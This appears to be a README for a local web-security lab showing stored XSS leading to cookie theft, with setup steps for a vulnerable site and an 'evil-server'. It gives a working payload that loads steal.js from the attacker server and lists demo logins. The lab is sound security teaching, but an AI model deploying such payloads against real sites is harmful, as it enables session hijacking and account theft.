# What is it about?
![Logic](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/XSS%2BCookieTheft/Output/Inkodo-2025429_34717.png)  

# How to use this?
+ `cd .\normal-site\ & npm install express body-parser`
+ `node .\app.js`
+ `cd .\evil-server\ & npm install express`
+ `node .\steal_cookie.js`
+ Open browser and visit website at `http://localhost:3000`
+ Try to post your comment on the page, and inspect the changes from browser Network/Elements Tab  
![StoredXSS](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/XSS%2BCookieTheft/Output/20250429091459.png)  
Recommended XSS payload: `<img src="x" onerror="const s=document.createElement('script');s.src='http://localhost:4000/steal.js';document.body.appendChild(s);" />`  
Not recommended XSS payload: `<script src="http://localhost:4000/steal.js"></script>`. This is because the limitations of `innerHTML`. The `<script>` tag dynamically inserted through `innerHTML` will be parsed by browser as a text node rather than an executable script.   
![Preflight Request](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/XSS%2BCookieTheft/Output/20250429091822.png)  
+ Pretend to be a normal user, revisit website at `http://localhost:3000`, and log in by entering correct username/password, so that cookie will be stored in browser:  
`admin/admin123`  
`user1/password1`  
![Cookie in browser](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/XSS%2BCookieTheft/Output/67tool-2025-04-29%2009_26_03.png)  
+ Inspect the result from terminal(evil-server)  
![Cookie Theft](https://github.com/dark-pool/Web-Security/blob/main/Test%20Experiment/XSS%2BCookieTheft/Output/20250429092022.png)  